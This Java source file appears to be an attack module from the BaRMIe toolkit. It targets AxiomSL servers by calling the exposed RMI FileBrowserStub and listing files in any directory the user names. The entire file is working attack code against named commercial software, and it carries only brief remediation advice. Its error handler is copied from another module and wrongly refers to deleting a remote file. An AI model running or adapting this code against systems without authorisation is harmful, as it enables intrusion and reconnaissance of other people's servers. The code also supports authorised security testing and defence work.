package nb.barmie.modes.attack.attacks.Axiom;

import axiomsl.server.rmi.FileBrowserStub;
import axiomsl.server.rmi.FileInformation;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.exceptions.BaRMIeRemoteMethodCallException;
import nb.barmie.modes.attack.RMIAttack;
import nb.barmie.modes.enumeration.RMIEndpoint;

/***********************************************************
 * List files in a given directory on a server running
 * AxiomSL.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class ListFiles extends RMIAttack {
	/*******************
	 * Set attack properties
	 ******************/
	public ListFiles() {
		super();
		this.setDescription("AxiomSL list files in directory");
		this.setDetailedDescription("AxiomSL exposes an object FileBrowserStub, which has a listFiles() method that returns a list of files in a given directory.");
		this.setRemediationAdvice("[AxiomSL] Update AxiomSL to the latest available version.");
	}
	
	/*******************
	 * Check if the given endpoint can be attacked.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 * @return True if we can attack it.
	 ******************/
	public boolean canAttackEndpoint(RMIEndpoint ep) {
		return ep.hasClass("axiomsl.server.rmi.FileBrowserStub");
	}
	
	/*******************
	 * Attack the endpoint.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 ******************/
	public void executeAttack(RMIEndpoint ep) throws BaRMIeException {
		FileBrowserStub fbs;
		FileInformation[] files;
		String path;
		
		//Ask the user for a directory to list files from
		path = this.promptUserForInput("Enter a path to list files from: ", false);
		System.out.println("");
		
		//Get the fileBrowser object from the endpoint
		System.out.println("[~] Getting fileBrowser object...");
		fbs = (FileBrowserStub)this.getRemoteObject(ep, "fileBrowser");
		
		//Attempt to list files
		try {
			System.out.println("[+] Retrieved, attempting to list files...");
			files = fbs.listFilesOnServer(path);
			if(files != null) {
				System.out.println("[+] Found " + files.length + " files:");
				for(FileInformation fi: files) {
					if(fi.bIsDirectory == true) {
						System.out.println("  [+] " + fi.sFileName + "/");
					} else {
						System.out.println("  [+] " + fi.sFileName);
					}
				}
			} else {
				System.out.println("[-] No file information returned");
			}
		} catch(Exception re) {
			//Failed to delte the file from the target
			throw new BaRMIeRemoteMethodCallException("Failed to delete the remote file.", re);
		}
	}
}
